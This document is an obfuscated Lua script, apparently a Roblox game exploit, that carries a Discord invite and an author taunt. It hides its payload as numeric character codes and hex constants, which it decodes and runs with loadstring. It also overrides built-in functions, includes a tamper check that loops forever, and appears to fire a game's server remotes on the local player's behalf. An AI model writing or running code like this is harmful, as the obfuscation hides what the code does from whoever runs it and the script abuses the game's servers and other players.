a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,ab,bb,cb,db,eb,fb,gb,hb,ib,jb,kb,lb,mb,nb,ob,pb,qb,rb,sb,tb=0x7500,0x7600,0x7700,0x7800,0x7900,0x7B00,0x7D00,0x2000,0x2200,0x2300,0x2700,0xA00,0x2800,0x2900,0x2A00,0x2C00,0x2D00,0x2E00,0x2F00,0x3000,0x3100,0x3200,0x3300,0x3400,0x3500,0x3600,0x3700,0x3800,0x3900,0x3A00,0x3B00,0x3D00,0x3F00,0x4100,0x4200,0x4300,0x4500,0x4600,0x4700,0x4800,0x4900,0x4C00,0x4D00,0x5000,0x5200,0x5300,0x5400,0x5600,0x5700,0x5A00,0x5B00,0x5D00,0x5F00,0x6100,0x6200,0x6300,0x6400,0x6500,0x6600,0x6700,0x6800,0x6900,0x6A00,0x6B00,0x6C00,0x6D00,0x6E00,0x6F00,0x7000,0x7200,0x7300,0x7400 ub={[10]=" ",[#"Gura is best, change my mind ;) "]=" ",[34]=[["]],[35]="#",[39]="'",[40]="(",[41]=")",[42]="*",[44]=",",[45]="-",[46]=".",[47]="/",[48]="0",[49]="1",[50]="2",[51]="3",[52]="4",[53]="5",[54]="6",[55]="7",[56]="8",[57]="9",[58]=":",[59]=";",[61]="=",[63]="?",[65]="A",[66]="B",[67]="C",[69]="E",[70]="F",[71]="G",[72]="H",[73]="I",[76]="L",[77]="M",[80]="P",[82]="R",[83]="S",[84]="T",[86]="V",[87]="W",[90]="Z",[91]="[",[93]="]",[95]="_",[97]="a",[98]="b",[#"discord.gg/vQBYBsvWhW"*#"Hello"-#"Ente;)"]="c",[#"Made by Admin.js ;) "*math.sqrt(math.sqrt(625))]="d",[#"Why even try?"*8-#"Yes"]="e",[102]="f",[10^2+#"Hi!"]="g",[104]="h",[105]="i",[106]="j",[107]="k",[108]="l",[109]="m",[#"Friends(00)"*#"Friends(0)"]="n",[(#"Math is not cool ;("-#"Rawr! ;)")*math.sqrt(#"Made by Admin.js ;) "*math.sqrt(math.sqrt(625)))+#"a"]="o",[112]="p",[114]="r",[115]="s",[#"I do, in fact hate Crocodiles"*math.sqrt(4^2)]="t",[117]="u",[118]="v",[119]="w",[120]="x",[121]="y",[#"Ducks are delicious!"+10^2+#"nuu"]="{",[125]="}",}function vb(Kb)if(ub[Kb])then return ub[Kb]end return string.char(Kb)end loadstring("wait = wait or function() return true end")()loadstring("if(getgenv == nil) then getgenv = function() return _ENV or _G end end")()function wb(Kb)xb,yb,zb,Ab=vb,string.split,{},{}for Lb=1,#Kb do zb[#zb+1]=xb((Kb[Lb]or 1))end Bb=function(Lb,Mb)local Nb=""for Ob=1,#Lb do Nb=Nb..Lb[Ob]if Mb then if Ob~=#Lb then Nb=Nb..Mb end end end return Nb end return""..string.gsub((Bb(zb,"")),"eend","end")end function Cb(Kb)xb,yb,zb,Ab=vb,string.split,{},{}for Lb=1,#Kb do zb[#zb+1]=xb((Kb[Lb]or 1))end Bb=function(Lb,Mb)local Nb=""for Ob=1,#Lb do Nb=Nb..Lb[Ob]if Mb then if Ob~=#Lb then Nb=Nb..Mb end end end return table.concat(Lb,Mb)end return""..string.gsub((Bb(zb,"")),"eend","end")end function Db(Kb,Lb)return tonumber(string.format("%."..(Lb or 0).."f",Kb))end function Eb(Kb,Lb)return Db(Kb/2^Lb)end loadstring(wb({112,99,97,108,108,40,102,117,110,99,116,105,111,110,40,41,32,32,32,32,10,32,32,115,101,116,114,101,97,100,111,110,108,121,40,116,97,98,108,101,44,102,97,108,115,101,41,10,101,110,100,41,10,112,99,97,108,108,40,102,117,110,99,116,105,111,110,40,41,10,32,32,103,101,116,103,101,110,118,40,41,46,116,97,98,108,101,46,99,111,110,99,97,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,10,32,32,32,32,108,111,99,97,108,32,99,61,34,34,102,111,114,32,100,61,49,44,35,97,32,100,111,32,10,32,32,32,32,32,32,99,61,99,46,46,97,91,100,93,10,32,32,32,32,32,32,105,102,32,98,32,116,104,101,110,32,10,32,32,32,32,32,32,32,32,105,102,32,100,126,61,35,97,32,116,104,101,110,32,10,32,32,32,32,32,32,32,32,32,32,99,61,99,46,46,98,32,10,32,32,32,32,32,32,32,32,101,110,100,32,10,32,32,32,32,32,32,101,110,100,32,10,32,32,32,32,101,110,100,59,10,32,32,32,32,114,101,116,117,114,110,32,99,32,101,110,100,32,10,32,32,101,110,100,41,10,32,32,112,99,97,108,108,40,102,117,110,99,116,105,111,110,40,41,32,32,32,32,10,32,32,32,32,115,101,116,114,101,97,100,111,110,108,121,40,116,97,98,108,101,44,116,114,117,101,41,10,32,32,101,110,100,41}))()local Jb={108,111,99,97,108,32,121,101,115,44,121,101,115,50,44,121,101,115,51,32,61,32,103,101,116,103,101,110,118,40,41,46,108,111,97,100,115,116,114,105,110,103,44,103,101,116,103,101,110,118,40,41,46,115,116,114,105,110,103,46,99,104,97,114,32,111,114,32,103,101,116,103,101,110,118,40,41,46,115,116,114,105,110,103,46,99,104,97,114,97,99,116,101,114,44,103,101,116,103,101,110,118,40,41,46,116,97,98,108,101,46,99,111,110,99,97,116,10,102,117,110,99,116,105,111,110,32,103,101,116,102,101,110,118,40,41,32,114,101,116,117,114,110,32,123,32,91,39,108,111,97,100,115,116,114,105,110,103,39,93,32,61,32,121,101,115,44,32,91,39,115,116,114,105,110,103,46,99,104,97,114,39,93,32,61,32,121,101,115,50,44,91,39,115,116,114,105,110,103,46,99,104,97,114,97,99,116,101,114,39,93,32,61,32,121,101,115,50,44,32,91,39,116,97,98,108,101,46,99,111,110,99,97,116,39,93,32,61,32,121,101,115,51,32,125,32,101,110,100}loadstring(Cb(Jb))()function Fb(Kb,Lb,Mb)for Nb=Kb,Lb do Mb(Nb)end end function Gb(Kb)xb,yb,zb,Ab=loadstring('return getfenv')()()[string.reverse(wb({114,97,104,99,46,103,110,105,114,116,115}))],loadstring('return getfenv')()()[(wb({116,97,98,108,101,46,99,111,110,99,97,116}))],{},{}print(#Kb,#Kb/2,#Kb/2+1)Fb(1,math.floor(#Kb/2),function(Lb)zb[#zb+1]=xb(Eb((Kb[Lb]or 1)/8,5))end)for Lb=math.floor(#Kb/2)+1,#Kb do Ab[#Ab+1]=vb(Eb((Kb[Lb]or 1)/8,5))end return(yb(zb,""))..table.concat(Ab,"")end Jb={105,102,32,103,101,116,103,101,110,118,40,41,46,108,111,97,100,115,116,114,105,110,103,126,61,108,111,97,100,115,116,114,105,110,103,32,111,114,32,103,101,116,103,101,110,118,40,41,46,116,97,98,108,101,46,99,111,110,99,97,116,126,61,116,97,98,108,101,46,99,111,110,99,97,116,32,111,114,32,103,101,116,103,101,110,118,40,41,46,115,116,114,105,110,103,46,99,104,97,114,97,99,116,101,114,126,61,115,116,114,105,110,103,46,99,104,97,114,97,99,116,101,114,32,116,104,101,110,32,114,101,112,101,97,116,32,112,114,105,110,116,40,34,110,111,44,32,116,104,97,110,107,32,121,111,117,34,41,117,110,116,105,108,32,110,105,108,32,101,110,100}loadstring(wb(Jb))()return(function()Hb=coroutine.create(function()Ib=loadstring('return getfenv')()()Ib[string.reverse(wb({103,110,105,114,116,115,100,97,111,108}))](Gb({h,rb,fb,tb,a,rb,ob,m,gb,a,ob,db,tb,jb,pb,ob,m,n,l,h,h,bb,rb,h,F,h,f,g,l,h,h,db,h,F,h,t,l,h,h,tb,jb,p,h,tb,db,p,h,nb,rb,h,F,h,tb,bb,cb,mb,fb,r,jb,ob,sb,fb,rb,tb,p,h,tb,bb,cb,mb,fb,r,db,pb,ob,db,bb,tb,p,h,nb,bb,tb,ib,r,rb,bb,ob,eb,pb,nb,l,h,h,db,pb,rb,pb,a,tb,jb,ob,fb,r,rb,fb,sb,a,nb,fb,m,db,pb,rb,pb,a,tb,jb,ob,fb,r,db,rb,fb,bb,tb,fb,m,gb,a,ob,db,tb,jb,pb,ob,m,n,l,h,h,h,h,gb,pb,rb,h,jb,v,F,t,p,u,t,t,h,eb,pb,l,h,h,h,h,h,h,tb,jb,m,bb,rb,p,h,nb,rb,m,n,h,o,h,jb,h,s,jb,v,n,E,l,h,h,h,h,fb,ob,eb,l,h,h,h,h,mb,pb,bb,eb,sb,tb,rb,jb,ob,hb,m,tb,db,m,bb,rb,p,h,k,E,k,n,n,l,h,h,h,h,bb,rb,h,F,h,f,g,l,h,h,h,h,c,bb,jb,tb,m,n,l,h,h,fb,ob,eb,n,n,l,jb,gb,m,ab,M,r,ib,a,cb,F,F,ob,jb,mb,h,pb,rb,h,ab,M,r,ib,a,cb,F,F,gb,bb,mb,sb,fb,n,tb,ib,fb,ob,h,rb,fb,tb,a,rb,ob,h,gb,bb,mb,sb,fb,h,fb,ob,eb,h,mb,pb,db,bb,mb,h,db,F,mb,pb,bb,eb,sb,tb,rb,jb,ob,hb,m,hb,bb,nb,fb,D,N,tb,tb,qb,M,fb,tb,m,i,ib,tb,tb,qb,D,s,s,u,C,w,r,B,w,r,u,y,C,r,u,v,z,D,w,t,t,t,s,hb,fb,tb,L,jb,mb,fb,G,L,jb,mb,fb,ob,bb,nb,fb,F,a,jb,mb,jb,cb,r,mb,a,bb,i,n,n,m,n,mb,pb,db,bb,mb,h,eb,F,db,D,J,rb,fb,bb,tb,fb,W,jb,ob,eb,pb,c,m,i,X,fb,rb,pb,U,c,pb,h,N,a,cb,i,n,mb,pb,db,bb,mb,h,fb,F,eb,D,J,rb,fb,bb,tb,fb,L,pb,mb,eb,fb,rb,m,i,Q,bb,jb,ob,i,n,mb,pb,db,bb,mb,h,gb,F,hb,bb,nb,fb,r,R,mb,bb,e,fb,rb,sb,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,h,mb,pb,db,bb,mb,h,gb,a,ob,db,tb,jb,pb,ob,h,hb,m,ib,n,bb,F,ib,D,M,fb,tb,J,ib,jb,mb,eb,rb,fb,ob,m,n,gb,pb,rb,h,jb,F,u,p,j,bb,h,eb,pb,h,jb,gb,h,bb,Y,jb,Z,D,O,sb,H,m,i,R,bb,rb,tb,i,n,tb,ib,fb,ob,h,cb,F,bb,Y,jb,Z,jb,gb,m,cb,r,H,ob,db,ib,pb,rb,fb,eb,n,tb,ib,fb,ob,h,mb,pb,db,bb,mb,h,kb,F,f,Y,u,Z,F,pb,sb,r,tb,jb,nb,fb,m,n,p,Y,v,Z,F,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,R,mb,bb,e,fb,rb,sb,i,n,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,ib,bb,rb,bb,db,tb,fb,rb,r,P,bb,a,ob,db,ib,fb,rb,r,T,tb,bb,tb,sb,p,Y,w,Z,F,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,R,mb,bb,e,fb,rb,sb,i,n,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,ib,bb,rb,bb,db,tb,fb,rb,r,P,bb,a,ob,db,ib,fb,rb,r,H,sb,sb,fb,tb,sb,r,S,pb,db,lb,fb,tb,p,Y,x,Z,F,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,R,mb,bb,e,fb,rb,sb,i,n,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,ib,bb,rb,bb,db,tb,fb,rb,r,P,bb,a,ob,db,ib,fb,rb,r,N,bb,ob,eb,mb,fb,p,Y,y,Z,F,J,L,rb,bb,nb,fb,r,ob,fb,c,m,cb,r,R,pb,sb,jb,tb,jb,pb,ob,p,V,fb,db,tb,pb,rb,w,r,ob,fb,c,m,t,r,z,C,A,t,x,w,A,A,z,y,u,v,u,y,p,q,t,r,t,w,A,u,t,A,z,w,C,t,u,x,A,v,u,p,t,r,A,u,z,t,z,A,A,C,t,C,B,y,u,u,n,n,p,Y,z,Z,F,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,R,mb,bb,e,fb,rb,sb,i,n,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,ib,bb,rb,bb,db,tb,fb,rb,r,P,bb,a,ob,db,ib,fb,rb,r,H,sb,sb,fb,tb,sb,r,S,pb,db,lb,fb,tb,r,I,pb,pb,nb,g,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,S,fb,qb,mb,jb,db,bb,tb,fb,eb,T,tb,pb,rb,bb,hb,fb,i,n,r,S,fb,nb,pb,tb,fb,sb,r,db,mb,jb,fb,ob,tb,T,fb,rb,b,fb,rb,S,pb,db,lb,fb,tb,D,L,jb,rb,fb,T,fb,rb,b,fb,rb,m,a,ob,qb,bb,db,lb,m,kb,n,n,mb,pb,db,bb,mb,h,lb,F,f,Y,u,Z,F,pb,sb,r,tb,jb,nb,fb,m,n,p,Y,v,Z,F,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,R,mb,bb,e,fb,rb,sb,i,n,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,ib,bb,rb,bb,db,tb,fb,rb,r,P,bb,a,ob,db,ib,fb,rb,r,T,tb,bb,tb,sb,p,Y,w,Z,F,cb,r,R,pb,sb,jb,tb,jb,pb,ob,p,Y,x,Z,F,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,R,mb,bb,e,fb,rb,sb,i,n,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,ib,bb,rb,bb,db,tb,fb,rb,r,P,bb,a,ob,db,ib,fb,rb,r,H,sb,sb,fb,tb,sb,r,S,pb,db,lb,fb,tb,r,I,pb,pb,nb,g,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,S,fb,qb,mb,jb,db,bb,tb,fb,eb,T,tb,pb,rb,bb,hb,fb,i,n,r,S,fb,nb,pb,tb,fb,sb,r,fb,d,qb,mb,pb,eb,fb,S,pb,db,lb,fb,tb,D,L,jb,rb,fb,T,fb,rb,b,fb,rb,m,a,ob,qb,bb,db,lb,m,lb,n,n,hb,bb,nb,fb,r,S,a,ob,T,fb,rb,b,jb,db,fb,r,N,fb,bb,rb,tb,cb,fb,bb,tb,D,W,bb,jb,tb,m,n,hb,bb,nb,fb,D,M,fb,tb,T,fb,rb,b,jb,db,fb,m,i,S,fb,qb,mb,jb,db,bb,tb,fb,eb,T,tb,pb,rb,bb,hb,fb,i,n,r,S,fb,nb,pb,tb,fb,sb,r,sb,fb,mb,mb,I,rb,jb,db,lb,sb,D,L,jb,rb,fb,T,fb,rb,b,fb,rb,m,n,fb,ob,eb,h,fb,ob,eb,h,fb,ob,eb,h,fb,ob,eb,h,fb,D,I,a,tb,tb,pb,ob,m,i,K,d,qb,mb,pb,eb,fb,h,db,a,rb,rb,fb,ob,tb,h,bb,rb,fb,bb,i,p,gb,a,ob,db,tb,jb,pb,ob,m,n,gb,pb,rb,h,ib,p,jb,h,jb,ob,h,qb,bb,jb,rb,sb,m,c,pb,rb,lb,sb,qb,bb,db,fb,r,H,rb,fb,bb,sb,Y,hb,bb,nb,fb,r,R,mb,bb,e,fb,rb,sb,r,P,pb,db,bb,mb,R,mb,bb,e,fb,rb,r,J,a,rb,rb,fb,ob,tb,H,rb,fb,bb,r,V,bb,mb,a,fb,Z,D,M,fb,tb,J,ib,jb,mb,eb,rb,fb,ob,m,n,n,eb,pb,h,jb,gb,h,jb,D,O,sb,H,m,i,Q,pb,eb,fb,mb,i,n,tb,ib,fb,ob,h,hb,m,jb,n,fb,ob,eb,h,fb,ob,eb,h,fb,ob,eb,n,h,fb,ob,eb,n,m,n}))()end)coroutine.resume(Hb)end)()
